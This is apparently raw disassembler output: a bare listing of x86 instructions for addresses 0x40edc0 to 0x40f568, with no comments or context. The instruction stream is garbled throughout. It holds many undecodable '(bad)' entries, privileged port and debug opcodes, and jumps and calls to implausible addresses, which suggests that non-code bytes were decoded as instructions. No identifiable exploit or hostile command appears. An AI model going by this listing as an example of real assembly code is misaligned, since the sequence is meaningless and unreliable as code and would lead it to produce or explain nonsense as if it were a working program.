  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
